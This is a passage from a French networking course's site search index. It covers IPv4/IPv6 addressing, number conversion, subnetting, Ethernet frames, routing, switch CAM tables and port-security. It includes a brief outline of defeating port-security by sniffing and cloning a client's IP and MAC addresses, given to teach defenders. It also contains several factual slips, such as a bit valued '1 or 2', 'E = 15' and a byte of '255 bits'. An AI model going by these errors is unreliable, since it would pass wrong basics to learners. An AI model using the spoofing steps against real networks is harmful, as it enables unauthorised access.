</p> <p>est .1 (situ\u00e9 a la fin de l'adresse)  </p> <p>Cela est definie par le masque de sous-r\u00e9seau </p> <p>Sur chaque <code>R\u00e9seau</code> une plage d'h\u00f4te sera definie en fonction du masque r\u00e9seau et du nb de bits disponible.  </p> <p>Mettons cela en demonstration: </p> <p>Rappel un octet ne peut contenir que 255 bits maximum  </p> <p>Dans le cas du tableau ci-dessus, le masque \u00e9tant en 255.255.255.0 nous voyons que seul le dernier octet est disponible (\u00e0 0) cela signifie que le r\u00e9seau peut avoir 255 h\u00f4tes disponible.  </p> <p>Cependant sur chaque r\u00e9seau (et sous-r\u00e9seau) 2 adresses son non adressable et non exploitable. il s'agit de la .0 &amp; .255  </p>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/#les-classes","title":"Les classes","text":"<p>Il existe 4 classes pour les adresses IPv4  </p> Classe Masque r\u00e9seau Adresses r\u00e9seau A 255.0.0.0 1.0.0.0 - 126.255.255.255 B 255.255.0.0 128.0.0.0 - 191.255.255.255 C 255.255.255.0 192.0.0.0 - 223.255.255.255 D 240.0.0.0 224.0.0.0 - 239.255.255.255 <p>Pour cela nous allons faire appel a la notion d'ID_R\u00e9seau &amp; d'ID_H\u00f4tes</p> <p>ID_R\u00e9seau : identifie le r\u00e9seau de l'adresse ID-H\u00f4te : nb de machines pouvant \u00eatre rattach\u00e9 au r\u00e9seau  </p>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/#classe-a-privees-et-publiques","title":"Classe A Priv\u00e9es et Publiques","text":"<p>L'*ID_R\u00e9seau est compris entre :</p> <ul> <li>Classe enti\u00e8re : 0 et 127</li> <li>Classe utilisable : 1 et 126</li> </ul> <p>L'ID_H\u00f4te contient : Nb <code>bits</code> @IP - Nb <code>bits</code>ID_R\u00e9seau \\(32 - 8 = 24\\) \\(2^{24}-2 = 16.777.214\\) h\u00f4tes possibles</p> <p></p>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/#classe-b-privees-et-publiques","title":"Classe B Priv\u00e9es et Publiques","text":"<p>L'*ID_R\u00e9seau est compris entre :</p> <ul> <li>Classe enti\u00e8re &amp; utilisable: 128 et 191</li> </ul> <p>L'ID_H\u00f4te contient : Nb <code>bits</code> @IP - Nb <code>bits</code>ID_R\u00e9seau \\(32 - 16 = 16\\) \\(2^{16}-2 = 65.534\\) h\u00f4tes possibles</p> <p></p>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/#classe-c-privees-et-publiques","title":"Classe C Priv\u00e9es et Publiques","text":"<p>L'*ID_R\u00e9seau est compris entre :</p> <ul> <li>Classe enti\u00e8re &amp; utilisable : 192 et 223</li> </ul> <p>L'ID_H\u00f4te contient : Nb <code>bits</code> @IP - Nb <code>bits</code>ID_R\u00e9seau \\(32 - 24 = 8\\) \\(2^{8}-2 = 254\\) h\u00f4tes possibles</p> <p></p>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/#classe-d-multidiffusion","title":"Classe D Multidiffusion","text":"<p>L'*ID_R\u00e9seau est compris entre :</p> <ul> <li>Classe enti\u00e8re &amp; utilisable : 224 et 239</li> </ul> <p>L'ID_H\u00f4te contient : Nb <code>bits</code> @IP - Nb <code>bits</code>ID_R\u00e9seau La Classe D ne contient aucun h\u00f4tes  </p> <p></p>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/#resume","title":"R\u00e9sum\u00e9","text":""},{"location":"Reseaux/Module_IP/Adressage_IPv4/#prive-et-publique","title":"Priv\u00e9 et Publique","text":""},{"location":"Reseaux/Module_IP/Adressage_IPv4/#adresse-prive","title":"Adresse Priv\u00e9","text":"<p>Les adresses priv\u00e9es ne sont utilisables que dans les r\u00e9seaux locaux priv\u00e9s et ne sont pas routables sur Internet Pour sortir sur le web un routeur utilisera le principe de NAT/PAT</p> <p></p>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/#publique","title":"Publique","text":"<p>Les adresses publique sont ouverte sur l'ext\u00e9rieur (publique), elle permet d'acc\u00e9der \u00e0 internet. Les autres ordinateurs connect\u00e9s au web utilisent l'IP Publique pour communiquer avec les appareils de votre r\u00e9seau.  </p> <p>Dans un r\u00e9seau domestique, le routeur sert d'interm\u00e9diaire entre les appareils de votre r\u00e9seau et le web. Il g\u00e8re toutes les connexions au nom des \u00e9quipements de votre r\u00e9seau.</p>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/#adresse-de-diffusion-ou-broadcast","title":"Adresse de diffusion ou Broadcast","text":"<p>Chaque r\u00e9seau poss\u00e8de une adresse de diffusion dit Broadcast Chaque h\u00f4te du r\u00e9seau r\u00e9pond \u00e0 cette adresse, cela permet d'envoyer un paquet \u00e0 tout le r\u00e9seau.  </p> <p>En g\u00e9n\u00e9ral cette adresse se termine par <code>255</code> par rapport au masque de sous-r\u00e9seau.  </p> <p>Ce qui donne:  </p> <ul> <li>192.168.1.255 est le broadcast du r\u00e9seau 192.168.1.0 avec un masque 255.255.255.0 ou /24</li> <li>10.0.255.255 est le broadcast du r\u00e9seau 10.0.0.0 avec un masque 255.255.0.0 ou /16</li> </ul>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/#adresse-apipa","title":"Adresse APIPA","text":"<p>APIPA pour : Automatic Private Internet Protocol Addressing (Adressage Priv\u00e9 IP Automatique). Il s'agit d'adresse d'autoconfiguration. G\u00e9n\u00e9ralement attribu\u00e9 \u00e0 la carte r\u00e9seau quand le serveur DHCP est HS. Ces adresses ne sont :  </p> <ul> <li>Pas routables sur Internet</li> <li>Non distribuables par un DHCP</li> <li>Non d\u00e9clar\u00e9es dans un serveur DNS</li> </ul> <p>L'adresse de r\u00e9seau logique est :  </p> <ul> <li>169.254.0.0/16</li> </ul>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/#len-tete-ipv4","title":"L'en-t\u00eate Ipv4","text":"<p>Pour envoyer un paquet IP, il faut ajouter une en-t\u00eate contenant les informations n\u00e9cessaires pour arriver \u00e0 destinations.  </p> <p></p> en-t\u00eate IPv4 empil\u00e9 <p>Explication des diff\u00e9rents champs :  </p> <ul> <li>Version (4bits) indique la version d'IP actuellement utilis\u00e9e.</li> <li>Longueur en-t\u00eate - IP Header Length (IHL) (4bits) indique le nombre de mots de 32 bits dans l'en-t\u00eate IP</li> <li>Type de service - Type-of-service (8bits) sp\u00e9cifie comment un protocole de couche sup\u00e9rieure particulier voudrait que le datagramme actuel soit trait\u00e9. Les datagrammes peuvent se voir attribuer diff\u00e9rents niveaux d'importance via ce champ</li> <li>Longueur totale (16bits) sp\u00e9cifie la longueur du paquet IP entier, y compris les donn\u00e9es et l'en-t\u00eate, en octets</li> <li>Le champs d'identification (16bits) contient un entier qui identifie le datagramme actuel. Ce champ est utilis\u00e9 pour aider \u00e0 reconstruire des fragments de datagrammes</li> <li>Flags (4bits; un n'est pas utilis\u00e9) contr\u00f4le si les routeurs sont autoris\u00e9s \u00e0 fragmenter un paquet et indique les parties d'un paquet au r\u00e9cepteur.</li> <li>TTL - Time-to-live (8bits) maintient un compteur qui d\u00e9cr\u00e9mente progressivement \u00e0 z\u00e9ro, point auquel le datagramme est rejet\u00e9.Cela emp\u00eache les paquets de boucler sans fin.</li> <li>Protocole (8bits) indique quel protocole de couche sup\u00e9rieure re\u00e7oit les paquets entrants une fois le traitement IP termin\u00e9.</li> <li>Header Checksum (16bits) permet de grantir l'int\u00e9grit\u00e9 de l'en-t\u00eate IP.</li> <li>Adresse IP source (32bit) sp\u00e9cifie le noeud d'envoi</li> <li>Adresse IP de destination (32bits) sp\u00e9cifie le noeud de r\u00e9ception</li> <li>Options (32bits) permet \u00e0 IP de prendre en charge diverses options, telles que la s\u00e9curit\u00e9</li> <li>Le champ de donn\u00e9es (32bits) contient des informations de couche sup\u00e9rieure</li> </ul> <p>Ci-dessous une capture Wireshark\u00ae d'une trame IPv4  </p> <p></p> capture ipv4 Wireshark\u00ae <p>1ere Couche</p> VersionHeader lenght : Longueur de l'en-t\u00eateTOS -Type Of ServiceLongueur Totale : Total Length <p>4</p> <p>20 octets (la vraie valeur est 5, mais wireshark l'interpr\u00e8te directement)</p> <p>0</p> <p>1326 octets</p> <p>2eme Couche</p> IPIDFlagFragment offset <p>58014</p> <p>2</p> <p>0</p> <p>3eme Couche</p> TTLProtocoleChecksum <p>64</p> <p>6 soit TCP</p> <p>Il est correct !</p> <p>4eme Couche</p> Adresse IP SourceAdresse IP destination <p>10.8.98.13</p> <p>74.125.230.81</p>"},{"location":"Reseaux/Module_IP/Adressage_IPv6/","title":"Adressage IPv6","text":"<p>Une adresse IPv6 est constitu\u00e9 de :</p> <ul> <li>128 <code>bits</code> en 8 groupes</li> <li>Chaque groupe = 16 <code>bits</code></li> <li>Utilise une notation hexad\u00e9cimale</li> <li>Chaque groupes est s\u00e9par\u00e9 par 2 points \":\" ex: 1fff:0000:0a88:85a3:0000:0000:ac1f:8001</li> <li>Chaque groupes est compos\u00e9 de 2 octets en h\u00e9xad\u00e9cimal</li> <li>Permet un espace d'adressage bien plus vaste.</li> </ul>"},{"location":"Reseaux/Module_IP/Conversion_decimal_binaire_hexadecimal/","title":"Conversion D\u00e9cimale/Binaire","text":"<p>Rappel sur les adresses IP Une adresse IP est une suite de : - 4 groupes de chifres  - 1 groupe = 1 octet    - 1 octet = 8 bits</p> <p>Ce qui nous interesse est le <code>bits</code> (acronyme de : BInary digiT)</p> <p>1 <code>bits</code> ne peut avoir que 2 valeurs possible : {1 ou 2}</p> <p>Si un bit = 1 on dit qu'il est allum\u00e9, sinon c'est qu'il est...\u00e9teint!</p> <p>Comme nous avons 8 <code>bits</code> par octet et qu'une adresse comporte 4 octet nous aurons donc une adresse IPv4 repr\u00e9sent\u00e9 sur 32 bits (32 chiffres)</p> <ul> <li>1x8=8 bits<ul> <li>8x4=32 bits</li> </ul> </li> </ul> <p>Dans un nombre binaire, chaque <code>bit</code>, s'il vaut 1, correspond \u00e0 un certain nombre en d\u00e9cimal.</p> <p>Ainsi de la droite vers la gauche on a:</p> <ul> <li>chiffre 8 = 128</li> <li>chiffre 7 = 64</li> <li>chiffre 6 = 32</li> <li>chiffre 5 = 16</li> <li>chiffre 4 = 8</li> <li>chiffre 3 = 4</li> <li>chiffre 2 = 2</li> <li>chiffre 1 = 1</li> </ul> <p>Nous allons donc convertir une adresse IPv4 en binaire. Prenons l'addresse 12.3.2.1 Decomposons octet par octet ce que cela repr\u00e9sente en bit (en reprenant la liste de correspondance du dessus) : </p> <p>12 = 8+4 3 = 2+1 2 = 2 1 = 1</p> <p>Puis reportons les resultat des additions dans le tableau du dessous en mettant un <code>1</code> dans les colonnes correspondante.</p> <p>Une fois fait complet chaque colonne vide par des <code>0</code></p> valeur d\u00e9cimale 128 64 32 16 8 4 2 1 12 = 8+4 0 0 0 0 1 1 0 0 3 = 2+1 0 0 0 0 0 0 1 1 2 = 2 0 0 0 0 0 0 1 0 1 = 1 0 0 0 0 0 0 0 1 <p>2 &amp; 1 \u00e9tant naturellement dans le tableau nous n'avons pas d'addition \u00e0 faire</p> <p>Maintenant nous avons notre adresse IPv4 d\u00e9cimal en binaire</p> <p>Valeur d\u00e9cimal :    12    .     3    .    2     .    1 Valeur binaire : 00001100 . 00000011 . 00000010 . 00000001</p> <p>Pour cela il suffit de regarder quelle <code>bits</code> sont allum\u00e9s et de les additionner.</p> <p>Avec le tableau du dessus nous pouvons representer des nombres de 0 \u00e0 255. Pour representer un chiffre plus grand il suffit d'etendre le tableau :</p> valeur d\u00e9cimale 1024 512 256 128 64 32 16 8 4 2 1 x\u00b2 2^10 2^9 2^8 2^7 2^6 2^5 2^4 2^3 2^2 2^1 2^0 2023 1 1 1 1 1 1 0 0 1 1 1 <p>ce qui donnera : 2023 : 1024 + 512 + 256 + 128 + 64  + 32  + 4   + 2   + 1 2023 : 2^10 + 2^9 + 2^8 + 2^7 + 2^6 + 2^5 + 2^2 + 2^1 + 2^0 2023 : 11111100111</p>"},{"location":"Reseaux/Module_IP/Conversion_decimal_binaire_hexadecimal/#hexadecimale","title":"Hexadecimale","text":"<p>Maintenant que le binaire est ok pour le calcul d'IPv4 passons \u00e0 l'hexadeciaml pour le calcul d'aresse IPv6.</p> <p>L'hexadecimal, contrairement au binaire, n'est plus une base 2 mais une base 16.</p> <p>En d\u00e9cimal, on \u00e9crit plusieurs chiffre pour repr\u00e9senter un nombre plus grand que 9. En binaire, ne disposant que de 2 chiffres (0 &amp; 1) on ajoutes un ou plusieurs chiffre(s) pour representer un nombre plus grand que 1. En h\u00e9xadecimal le principe est le m\u00eame mais pour repr\u00e9senter un nombre plus grand que 15.</p> <p>Voici la correspondance entre nombre d\u00e9cimaux, binaire et h\u00e9xad\u00e9cimaux :</p> D\u00e9cimal Binaire h\u00e9xad\u00e9cimal 0 0 0 1 0001 1 2 0010 2 3 0011 3 4 0100 4 5 0101 5 6 0110 6 7 0111 7 8 1000 8 9 1001 9 10 1010 A 11 1011 B 12 1100 C 13 1101 D 14 1110 E 15 1111 F 16 10000 10 17 10001 11 ... ... ... <p>Pour convertir FE80 (que nous retrouvons r\u00e9guli\u00e8rement sur les add. IPv6) il suffit de convertir chaque \u00e9l\u00e9ments. F = 15 = 1111 E = 15 = 1110 8 = 8 = 1000 0 = 0 = 0000</p> <p>FE80 = 1111 1110 1000 0000 Comme un chiffre h\u00e9xad\u00e9cimal correspond \u00e0 4 chiffres binaires, la s\u00e9paration en blocs de 4 <code>bits</code> rend la lecture plus facile.</p> <p>! Un ordinateur ne peut traiter des valeurs num\u00e9rique que sous forme d'octets, le nb 98 peut ainsi \u00eatre stocker sur 1 octet car il faut 7 <code>bits</code> pour le repr\u00e9senter. Par contre le nb 256 n\u00e9cessite 9 <code>bits</code> on doit donc mobiliser 2 octets.</p>"},{"location":"Reseaux/Module_IP/sous_reseau/","title":"Masque de Sous-R\u00e9seau","text":""},{"location":"Reseaux/Module_IP/sous_reseau/#la-creation-de-sous-reseaux","title":"La cr\u00e9ation de sous-r\u00e9seaux","text":"<p>Le calcul des masques de sous-r\u00e9seaux est une \u00e9tape indispensable pour obtenir le nombre d'h\u00f4tes disponibles dans un r\u00e9seau. Cela permet de determiner, en fonction ses besoins, le nombre de sous-r\u00e9seaux \u00e0 mettre en place pour effectuer une segmentation. C'est \u00e9galement un moyen d'obtenir l'adresse du r\u00e9seau ainsi que l'adresse de broadcast du r\u00e9seau.  </p> <p>La cr\u00e9ation de sous-r\u00e9seaux permet :  </p> <ul> <li>de limiter l'impact des diffusions ARP</li> <li>Equilibrer le trafic r\u00e9seau</li> <li>Isoler des machines</li> <li>Mettre en place un peu de s\u00e9curit\u00e9</li> <li>Optimiser l'utilisation des adresses IP</li> </ul>"},{"location":"Reseaux/Module_IP/sous_reseau/#masque-de-sous-reseau_1","title":"Masque de sous-r\u00e9seau?","text":"<p>Pour rappel !</p> <p>Une adresse IPv4 est constitu\u00e9 de 4 blocs de chiffre allant de \"0\" \u00e0 \"255\". Chaque bloc correspond \u00e0 1 octet lui m\u00eame \u00e9gal \u00e0 8 bits. Une IPv4 est cod\u00e9e sur 4 octets donc 32 bits. - La 1ere partie correspond \u00e0 l'ID_R\u00e9seau - LA 2eme partie correspond \u00e0 l'ID_H\u00f4tes.  </p> <p>la cr\u00e9ation d'un sous-r\u00e9seaux vas faire apparaitre une nouvelle partie dans l'adresse IP:  </p> <ul> <li>ID_R\u00e9seau</li> <li>ID_ss-r\u00e9seau (cr\u00e9\u00e9 \u00e0 partir de bits issus de l'ID_H\u00f4tes)</li> <li>ID_H\u00f4tes</li> </ul> <p>Le masque de sous-r\u00e9seau d\u00e9limite la partie ID_R\u00e9seau et la partie ID_H\u00f4tes </p> <p>Le masque de sous-r\u00e9seau peut s'\u00e9crire de deux fa\u00e7ons diff\u00e9rentes :   </p> <ul> <li>Notation d\u00e9cimales : 255.255.255.0, 255.0.0.0, 255.255.248.0, etc.</li> <li>Notation CIDR : /8, /16, /22, /24, etc.</li> </ul> <p>La notation CIDR est la norme aujourd'hui et sachez qu'elle commence \u00e0 /0 pour 0.0.0.0 et se termine \u00e0 /32 pour 255.255.255.255.  </p>"},{"location":"Reseaux/Module_IP/trame_ethernet/","title":"Trame Ethernet","text":""},{"location":"Reseaux/Module_IP/trame_ethernet/#trame-8023","title":"Trame 802.3","text":"<p>La trame ethernet est une technologie de communications pour les r\u00e9seaux locaux. Elle \u00e0 \u00e9t\u00e9 standardis\u00e9 par l'organisation IEEE sous le nom IEEE 802.3  </p> <p>Ethernet est aujourd'hui la technologie la plus utilis\u00e9e sur des supports filaires, qu'il s'agisse de c\u00e2ble \u00e9lectrique ou de fibre optique.</p> <p>Pour que les machines communiquent, Ethernet d\u00e9finit un format commun, structur\u00e9 en plusieurs champs.  </p> <p></p> <ul> <li>Destination MAC Address : il s'agit de l'adresse mac de destinations sur 6 octets</li> <li>Source MAC Address : Toujours sur 6 octets il s'agit de l'adresse MAC de la source de la transmission</li> <li>EtherType : Sur 2 octets, ils definissent le protocole de niveau sup\u00e9rieur utilis\u00e9 dans le champs \"DATA\" de la trame</li> <li>DATA : Celle-ci \u00e0 une taille minimale et maximale impos\u00e9 pour les donn\u00e9es \u00e0 transporter. La taille minimale impos\u00e9e est une cons\u00e9quence directe de la m\u00e9thode d'acc\u00e8s utilis\u00e9e, CSMA/CD, qui n\u00e9cessite une dur\u00e9e minimale de transmission pour chaque message</li> <li>CRC Checksum : Champ utilis\u00e9 par le r\u00e9cepteur afin de d\u00e9terminer si la trame a \u00e9t\u00e9 impact\u00e9e par une erreur de transmission.</li> </ul>"},{"location":"Reseaux/Module_IP/trame_ethernet/#trame-8021q","title":"Trame 802.1Q","text":"<p>La norme 802.1Q permet l'utilisation de VLAN, en ajoutant 4 octets dans l'ent\u00eate de la trame juste apr\u00e8s les adresses MAC destination et source. On parle de trame Ethernet \"tagg\u00e9\" ou VLAN \"tagg\u00e9\", r\u00e9parties dans 2 champs distincts  </p> <p> </p> TPIDTCI <p>Tag Protocol Identifier d\u00e9termine le type du tag</p> <p>Compos\u00e9 de 3 parties:  </p> Priorit\u00e9CFIVID <p>Ce champs permet de r\u00e9aliser une priorisation des flux. Le champs \u00e9tant sur 3 bits il est possible de d\u00e9terminer 7 niveaux de priorit\u00e9.</p> <p>Ce bit permet de d\u00e9terminer si le tag s'applique \u00e0 une trame de type Ethernet ou Token-Ring.</p> <p>Vlan Identifier. Comme son nom l'indique c'est l'identifiant du VLAN. L'appartenance d'une trame \u00e0 un VLAN se fait gr\u00e2ce \u00e0 cet identifiant. Le champs \u00e9tant sur 12 bits, il est possible de d\u00e9clarer jusqu'\u00e0 4096 VLANs.</p>"},{"location":"Reseaux/Routage/le_routeur/","title":"Routeur","text":""},{"location":"Reseaux/Routage/le_routeur/#principe-du-routage","title":"Principe du routage","text":"<p>Le routage est la fonctionnalit\u00e9 qui permet d'acheminer les donn\u00e9es d'un point A vers un point B situ\u00e9 dans un r\u00e9seau distant. Le routage, effectu\u00e9 par les routeurs, se base sur l'adresse IP de destination contenu dans le paquet re\u00e7u.  </p> <p></p> <ol> <li>Le PC envoi un paquet IP \u00e0 destination du serveur de droite.    Ce paquet est envoy\u00e9 \u00e0 sa passerelle par d\u00e9faut (le premier routeur de gauche, cf explication pr\u00e9c\u00e9dente)</li> <li>La passerelle (le routeur) re\u00e7oit le paquet, extrait l\u2019adresse IP de destination (le serveur de droite) et la compare \u00e0 sa table de routage. La table lui indique d\u2019envoyer ce paquet \u00e0 un routeur voisin pr\u00e9cis</li> <li>Idem que l\u2019\u00e9tape 2</li> <li>Idem que l\u2019\u00e9tape 2</li> <li>Le routeur re\u00e7oit le paquet : il extrait l\u2019adresse IP de destination et la compare \u00e0 sa table de routage.    La table lui indique cette fois-ci qu\u2019une de ses interfaces est directement dans le r\u00e9seau de destination (qui contient l\u2019adresse IP du serveur).    Le routeur envoi le paquet IP \u00e0 la destination (le serveur de droite) sans passer par un autre routeur.  </li> </ol>"},{"location":"Reseaux/Switch_VLAN/Switch/","title":"Le Switch","text":""},{"location":"Reseaux/Switch_VLAN/Switch/#principe","title":"Principe","text":"<p>Un switch est un composant essentiel d'un r\u00e9seau informatique. Il permet de connecter plusieurs appareils (ordinateurs, imprimantes, des serveurs, etc.) au sein d'un r\u00e9seau local (LAN - Local Area Network) afin de les faires communiquer entre eux. Le switch contibue \u00e0 la s\u00e9curit\u00e9 du r\u00e9seau (en contr\u00f4lant les intrusions) et \u00e0 la protection des donn\u00e9es via le r\u00e9seau. Une fois param\u00e8tr\u00e9, un switch ne distribue l'information qu'aux utilisateurs pr\u00e9d\u00e9finis en fonction de la typologie de collaborateurs et/ou de certaines restrictions.  </p>"},{"location":"Reseaux/Switch_VLAN/Switch/#les-differents-types-de-switches","title":"Les diff\u00e9rents types de switches","text":"<ul> <li>Type \"diff\u00e9r\u00e9\" (store and forward) : mod\u00e8le de switch standard, il stocke les donn\u00e9es r\u00e9seau pour les analyser, permettant de d\u00e9tecter d'\u00e9ventuelles erreurs avant des les transmettres.</li> <li>Type \"direct\" (cut through) : lit l'adresse de destinations et transmet sans analyser les donn\u00e9es.</li> <li>Type \"fragment free\" : Il s'agit d'un m\u00e9lange entre les 2 m\u00e9thodes pr\u00e9cedente, il effectuent une d\u00e9tection d'erreur sans stock\u00e9 les donn\u00e9es cela permet d'am\u00e9liorer la rapidit\u00e9 de transmission.</li> <li>Type \"adaptive and through\" : Il selectionne automatiquement un des modes cit\u00e9s pr\u00e9c\u00e9demment, en fonction des erreurs constat\u00e9es.</li> </ul> <p>A cela s'ajoute les diff\u00e9rents niveau de switch :  </p> <p> </p> <p>Switch niveau 1</p> <p>Non-param\u00e9trables : Ce type de switch ne dispose pas d'interface de param\u00e9trage, ils se contentent uniquement de diffuser les donn\u00e9es sur les diff\u00e9rents ports pr\u00e9sent.  </p> <p> </p> <p>Switch niveau 2</p> <p>Param\u00e9trables via une interface web ou en ligne de commande  </p> <p></p> <p>Switch de niveau 3</p> <p>Param\u00e9trables Ils permettent de mettre en place un routage interne selon les adresses IP et les adresses MAC</p> <p></p> <p>Switch Cloud</p> <p>Param\u00e9trables Ils permettent de r\u00e9aliser les m\u00eames actions que les autres switches mais l'interface est consultable \u00e0 distance sur tous types d'appareil. Fonctionne via un syst\u00e8me de cloud s\u00e9curis\u00e9.</p>"},{"location":"Reseaux/Switch_VLAN/Switch/#la-table-cam","title":"La Table CAM","text":"<p>C.A.M : Content-Addressable Memory  </p> <p>La table CAM est la base de r\u00e9f\u00e9rence d'un switch en terme de commutation de trame.  </p> <p>Commutation d'une trame = Switch = Niveau 2 = Table CAM via adresse MAC Routage d'un paquet = Routeur = Niveau 3 = Table de routage via adresse IP </p> <p>Cela lui permet de savoir quelle adresse MAC va sur quel port.  </p> <p>Il ne faut pas confondre</p> Table ARPTable CAM <p>Relation entre adresse IP et une adresse MAC</p> <p>Relation entre adresse MAC et un num\u00e9ro de port !</p>"},{"location":"Reseaux/Switch_VLAN/Switch/#presentation-de-la-table-cam","title":"Pr\u00e9sentation de la table CAM","text":"<p>Principe de fonctionnement :  </p> <p>Un Switch recoit une trame d'un p\u00e9riph\u00e9riques :  </p> <ul> <li>Il regarde l'adresse MAC de destination dans la trame  </li> <li>Il regarde dans sa table CAM et trouve :</li> <li>XXXX:XXXX:XXXX:XXXX via FastEthernet 0/1</li> <li>Il sait donc que l'adresse MAC xxxx.xxxx.xxxx.xxxx est sur le port Fa0/1</li> <li>Il transf\u00e8re la trame sur le port Fa0/1</li> </ul> <p>Voyons comment la table CAM se remplit.  </p>"},{"location":"Reseaux/Switch_VLAN/Switch/#entree-statique","title":"Entr\u00e9e Statique","text":"<p>Une solution \u00e0 mettre en place avec prudence et uniquement lorsque aucun autres choix n'est possible.  </p> <pre><code>Sw(config)# mac address-table static xxxx.xxxx.xxxx.xxxx vlan 10 int Fa0/1\n</code></pre>"},{"location":"Reseaux/Switch_VLAN/Switch/#entree-dynamique","title":"Entr\u00e9e Dynamique","text":"<p>Par d\u00e9faut les switchs Cisco remplissent leur table dynamiquement.</p> <p>Un switch utilise sa table CAM pour distribuer les trames qu'il re\u00e7oit uniquement aux destinataires concern\u00e9s. Il enregistrera l'adresse MAC source de toutes les trames dans la table CAM Pour d\u00e9sactiver le remplissage automatique de la table CAM de votre \u00e9quipement, utilisez la commande suivante:  </p> <pre><code>Switch(config)# mac address-table learning vlan\n</code></pre>"},{"location":"Reseaux/Switch_VLAN/Switch/#expiration-des-entrees","title":"Expiration des entr\u00e9es","text":"<p>Par d\u00e9faut l'expiration des entr\u00e9es est regl\u00e9e sur :  </p> <ul> <li>300s pour un switch</li> <li>14400s pour un routeur</li> </ul> <p>Pour le changer :  </p> <pre><code>Switch(config)# mac adress-table aging-time 300\n</code></pre>"},{"location":"Reseaux/Switch_VLAN/Switch/#chercher-une-adresse-mac-sur-un-reseau-lan","title":"Chercher une adresse mac sur un r\u00e9seau LAN","text":""},{"location":"Reseaux/Switch_VLAN/Switch/#les-ports","title":"Les ports","text":""},{"location":"Reseaux/Switch_VLAN/Switch/#mode","title":"Mode","text":"<p>Sur un port de switch Cisco on rencontre deux modes pour les ports: Voir fiche VLAN</p> <ul> <li>Access : port qui ne transporte des informations que d'un seul VLAN. A priori, ce type de port connectera un h\u00f4te terminal, une station de travail ou un serveur.  </li> <li>Trunk : Il s'agit d'un port qui transporte des informations de plusieurs VLANs. On y connectera un autre switch , un routeur ou un serveur poss\u00e9dant une    carte r\u00e9seau IEEE 802.1q (configur\u00e9 en port \"Trunk\").   Un port \"Trunk\" ajoute des \u00e9tiquettes au trafic puisqu'il est destin\u00e9 \u00e0 un autre switch.   Le VLAN natif est celui pour lequel il n'y aura pas d'\u00e9tiquette ajout\u00e9e.   Ce param\u00e8tre se d\u00e9finit sur le port \"Trunk\"  </li> </ul>"},{"location":"Reseaux/Switch_VLAN/Switch/#securite","title":"S\u00e9curit\u00e9","text":"<p>En plus des m\u00e9thodes, detaill\u00e9 apr\u00e8s, des gestes simples peuvent augmenter rapidement la s\u00e9curit\u00e9 :  </p> <ul> <li>Mettre un mot de passe sur toutes les lignes d'acc\u00e8s et les diff\u00e9rents modes du switch.</li> <li>Utiliser le protocole SSH</li> <li>Sortir les ports du VLAN 1 Natif</li> <li>D\u00e9sactiver les ports non utilis\u00e9s du switch</li> </ul> <p>Afin de s\u00e9curiser l'acc\u00e8s physique \u00e0 notre r\u00e9seau, nous pouvons utiliser deux m\u00e9thodes :</p> <ul> <li>Port-Security : S\u00e9curisation de nos ports via adresse MAC</li> <li>Port-based authentication : S\u00e9curisation de nos ports via le protocole 802.1x</li> </ul>"},{"location":"Reseaux/Switch_VLAN/Switch/#le-port-security","title":"Le Port-Security","text":"<p>Les adresses MAC permettent d'identifier une carte r\u00e9seau. le Port-security se base sur ces adresses pour autoriser ou non une connexion sur un port.  </p> <p>Le port-security comporte 2 modes de fonctionnements: </p> <ul> <li>le mode statique</li> <li>le mode dynamique</li> </ul> <p>Il existe 3 types de r\u00e9actions si une connexion se pr\u00e9sente avec une MAC non autoris\u00e9e via l'option <code>violation</code>:</p> ShutdownRestrictProtect <p>Le port va se mettre en mode <code>ERR-DISABLE</code>. Une action humaine sera n\u00e9cessaire pour remettre le port en \u00e9tat de fonctionner. Le switch garde une trace de cette violation.</p> <p>Le port va dropper toutes les trames re\u00e7ues par cette adresse MAC. Il traitera toujours les trames poss\u00e9dant une adresse MAC autoris\u00e9e. Le switch garde une trace de cette violation.</p> <p>Identique au mode \"restrict\" Le switch ne garde pas de trace des violations.</p>"},{"location":"Reseaux/Switch_VLAN/Switch/#la-configuration","title":"La configuration","text":"<p>La configuration des diff\u00e9rents mode est expliqu\u00e9 sur la page Cisco</p>"},{"location":"Reseaux/Switch_VLAN/Switch/#la-faiblesse-du-port-security","title":"La faiblesse du port-security","text":"<p>Pour une personne malveillante, un changement d'adresse MAC peut-\u00eatre facilement faisable. Pour prouver cela je vais reprendre l'exemple post\u00e9 sur le site fingerinthenet </p> <p>Exemple: Une personne malveillante veut se connecter \u00e0 notre r\u00e9seau. Il va donc devoir prendre la place de quelqu'un afin d'\u00eatre s\u00fbr que le port soit ouvert et d'\u00eatre dans un vlan fonctionnel. Pour ce faire il va d\u00e9brancher un client du r\u00e9seau afin de faire un point \u00e0 point avec ce dernier.  </p> <ol> <li>Gr\u00e2ce au logiciel Wireshark\u00ae, il va apprendre l'adresse IP et l'adresse MAC du client.</li> <li>Il va s'attribuer l'adresse IP du client</li> <li>Il va s'attribuer l'adresse MAC du client via un logiciel (Technitium)</li> <li>Il ne lui reste plus qu'\u00e0 se connecter au r\u00e9seau et le tour est jou\u00e9 !</li> </ol> <p></p>"},{"location":"Reseaux/Switch_VLAN/Switch/#conclusion","title":"Conclusion","text":"<p>Le port-security est une m\u00e9thode permettant de s\u00e9curiser l'acc\u00e8s au r\u00e9seau. Cette solution est facile \u00e0 mettre en \u00e0 mettre en place et bloquera une personne lambda souhaitant se connecter au r\u00e9seau.  </p>"},{"location":"Reseaux/Switch_VLAN/Switch/#port-based-authentification","title":"Port-Based Authentification","text":"<p>Il s'agit d'un protocole plus fiable que le port-security.  </p> <p>Client: doit ex\u00e9cuter le protocole 802.1x afin de pouvoir s'authentifier Switch: sers de lien entre le Serveur Radius et le client EAPoL Serveur: Authentifie le Client  </p> <ul> <li>Avant l'authentification le protocole 802.1x ne laissant passer que les trames EAPoL (Extensible Authentification Protocol Over LAN)</li> <li>Apr\u00e8s l'authentification le protocole 802.1x laissera passer tout le trafic.  </li> </ul>"},{"location":"Reseaux/Switch_VLAN/Switch/#configuration","title":"Configuration","text":"<p>La configuration est expliqu\u00e9 sur la page Cisco</p>"},{"location":"Reseaux/Switch_VLAN/Switch/#acces-a-distance-securise","title":"Acc\u00e8s \u00e0 distance 